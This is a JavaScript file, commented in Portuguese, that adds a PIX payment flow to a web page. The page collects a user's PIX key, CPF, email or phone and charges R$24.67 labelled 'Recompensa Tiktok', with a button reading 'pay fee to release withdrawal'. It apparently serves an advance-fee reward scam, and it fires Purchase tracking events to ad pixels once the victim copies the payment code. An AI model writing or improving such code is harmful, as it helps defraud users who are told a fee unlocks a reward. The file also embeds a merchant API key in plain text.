/**
 * pix-sdk.js — Integração SDK Fast API (Mangofy)
 *
 * FLUXO:
 *  #five (form PIX) → #seven (loading) → #nine (confirmação)
 *  Em #nine: clique no botão → generatePix() → QR Code aparece no lugar do botão
 */

(function () {

  /* ESTILOS */
  var style = document.createElement("style");
  style.textContent = [
    ".pix-panel-subtitle{font-size:13px;color:#666;margin-bottom:16px;line-height:1.4;text-align:center}",
    ".pix-qr-wrapper{display:flex;justify-content:center;margin-bottom:16px}",
    ".pix-qr-img{width:190px;height:190px;border:1px solid #e5e5e5;border-radius:8px;padding:8px;background:#fff;box-sizing:border-box;display:block}",
    ".pix-copy-wrapper{display:flex;flex-direction:column;align-items:center;gap:10px;margin-bottom:14px}",
    ".pix-code-text{width:100%;min-height:70px;border:1px solid #e5e5e5;border-radius:6px;padding:10px;font-size:11px;font-family:Monaco,Menlo,monospace;color:#1a1a1a;background:#f8f8f8;resize:none;box-sizing:border-box;word-break:break-all;text-align:left}",
    ".btn-copy-pix{background:#000;color:#fff;border:none;border-radius:7px;padding:12px 20px;font-size:14px;font-weight:600;cursor:pointer;width:100%;transition:opacity .2s}",
    ".btn-copy-pix:hover{opacity:.85}",
    ".btn-copy-pix:active{opacity:.7}",
    ".copy-feedback{font-size:12px;color:#10b981;font-weight:500;min-height:18px;text-align:center}",
    ".pix-panel-hint{font-size:11px;color:#999;margin-top:6px;text-align:center}",
    ".pix-panel-error{border:1px solid #fecaca;background:#fff5f5;border-radius:8px;padding:14px;text-align:center;margin-top:16px}",
    ".pix-error-msg{font-size:13px;color:#dc2626;font-weight:500;margin:0 0 10px 0}",
  ].join("");
  document.head.appendChild(style);

  /* CALLBACK GLOBAL — chamado pelo SDK ao confirmar pagamento */
  window.paymentApproved = function () {
    /* implementação futura */
  };

  /* CARREGA O SDK */
  function loadPixSDK() {
    return new Promise(function (resolve, reject) {
      if (document.getElementById("pix-sdk-script")) { resolve(); return; }
      var s = document.createElement("script");
      s.id  = "pix-sdk-script";
      s.src = "https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstgl28j-c05b14ff-33f5-46a6-9c1a-1dd6fa0309d3";
      s.onload  = resolve;
      s.onerror = reject;
      document.head.appendChild(s);
    });
  }

  /* MONTA CONFIG COM DADOS DO FORMULÁRIO (#five) */
  function buildConfig() {
    var d = window.__formData || {};
    try {
      var stored = localStorage.getItem("userPixData");
      if (stored && !d.nome) d = JSON.parse(stored);
    } catch (e) {}

    var tipo  = d.tipoChave || "";
    var chave = d.chavePix  || "";

    return {
      total_price: 24.67,
      customer: {
        name:     d.nome || "",
        document: tipo === "CPF"     ? chave.replace(/\D/g, "") : "",
        email:    tipo === "E-mail"  ? chave : "",
        phone:    tipo === "Celular" ? "+55" + chave.replace(/\D/g, "") : "",
      },
      items: [{ name: "Recompensa Tiktok", price: 24.67, quantity: 1 }],
    };
  }

  /* ESTADO DO BOTÃO */
  function setCtaLoading(on) {
    var btn = document.getElementById("confirmation-button");
    if (!btn) return;
    btn.textContent       = on ? "⏳ Gerando PIX..." : "Pagar taxa para Liberar Saque";
    btn.style.pointerEvents = on ? "none" : "";
    btn.style.opacity     = on ? "0.75"  : "";
  }

  /* EXIBE PAINEL PIX */
  function showPixPanel(response) {
    var panel  = document.getElementById("pix-payment-panel");
    var qrImg  = document.getElementById("pix-qr-img");
    var codeEl = document.getElementById("pix-code-text");
    var errEl  = document.getElementById("pix-error-panel");

    if (errEl)  errEl.style.display  = "none";
    if (qrImg  && response.qrCodeImage) qrImg.src    = response.qrCodeImage;
    if (codeEl && response.pixCode)     codeEl.value = response.pixCode;
    if (panel)  panel.style.display  = "block";

    // Esconde o botão CTA
    var btn = document.getElementById("confirmation-button");
    if (btn) btn.style.display = "none";

    // Scroll até o painel
    if (panel) setTimeout(function () { panel.scrollIntoView({ behavior: "smooth", block: "start" }); }, 100);
  }

  /* EXIBE ERRO */
  function showPixError(msg) {
    var errEl  = document.getElementById("pix-error-panel");
    var errMsg = document.getElementById("pix-error-msg");
    if (errMsg) errMsg.textContent = "⚠️ " + (msg || "Não foi possível gerar o PIX. Tente novamente.");
    if (errEl)  errEl.style.display = "block";
  }

  /* BOTÃO COPIAR */
  function bindCopyButton() {
    var btn      = document.getElementById("btn-copy-pix");
    var feedback = document.getElementById("copy-feedback");
    if (!btn) return;

    btn.addEventListener("click", function () {
      var el = document.getElementById("pix-code-text");
      if (!el) return;

      function done() {
        if (feedback) feedback.textContent = "✅ Código copiado!";
        btn.textContent = "✅ Copiado!";
        setTimeout(function () {
          if (feedback) feedback.textContent = "";
          btn.textContent = "📋 Copiar código PIX";
        }, 2500);

        // Dispara evento Purchase — funciona com qualquer pixel já carregado no HTML
        try {
          if (typeof ttq !== "undefined") ttq.track("Purchase", { value: 24.67, currency: "BRL" });
          if (typeof fbq !== "undefined") fbq("track", "Purchase", { value: 24.67, currency: "BRL" });
          if (typeof gtag !== "undefined") gtag("event", "purchase", { value: 24.67, currency: "BRL" });
        } catch (e) {}
      }

      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(el.value).then(done).catch(function () {
          el.select(); document.execCommand("copy"); done();
        });
      } else {
        el.select(); document.execCommand("copy"); done();
      }
    });
  }

  /* HANDLER DO CLIQUE NO BOTÃO CTA */
  async function handlePixButtonClick(ev) {
    if (ev) ev.preventDefault();

    try { await loadPixSDK(); }
    catch (e) { showPixError("Erro ao carregar o módulo de pagamento. Recarregue a página."); return; }

    if (typeof generatePix !== "function") {
      showPixError("Módulo de pagamento indisponível. Recarregue a página.");
      return;
    }

    setCtaLoading(true);

    try {
      var response = await generatePix(buildConfig());
      setCtaLoading(false);

      if (response && response.success) {
        showPixPanel(response);
      } else {
        showPixError("Não foi possível gerar o PIX. Tente novamente.");
      }
    } catch (err) {
      setCtaLoading(false);
      console.error("[PIX SDK] Erro:", err);
      showPixError("Ocorreu um erro inesperado. Tente novamente.");
    }
  }

  /* VINCULA BOTÃO CTA AO ABRIR #nine */
  function bindCtaButton() {
    var btn = document.getElementById("confirmation-button");
    if (!btn) return;

    // Remove comportamento antigo de link/redirect
    btn.removeAttribute("href");
    btn.removeAttribute("onclick");
    if (btn.tagName === "A") btn.setAttribute("role", "button");

    if (btn._pixHandler) btn.removeEventListener("click", btn._pixHandler);
    btn._pixHandler = handlePixButtonClick;
    btn.addEventListener("click", btn._pixHandler);

    bindCopyButton();
  }

  /* HOOK NO ROUTER */
  function hookRouter() {
    var attempts = 0;
    var check = setInterval(function () {
      attempts++;
      if (typeof window.showScreen === "function") {
        clearInterval(check);
        var orig = window.showScreen;
        window.showScreen = function (id, push) {
          orig(id, push);
          if (String(id) === "nine") setTimeout(bindCtaButton, 250);
        };
      }
      if (attempts > 50) clearInterval(check);
    }, 100);
  }

  /* INIT */
  function init() {
    hookRouter();
    if (location.hash === "#nine") setTimeout(bindCtaButton, 300);
    loadPixSDK().catch(function () {
      console.warn("[PIX SDK] Pré-carregamento falhou — será tentado novamente ao clicar.");
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }

})();
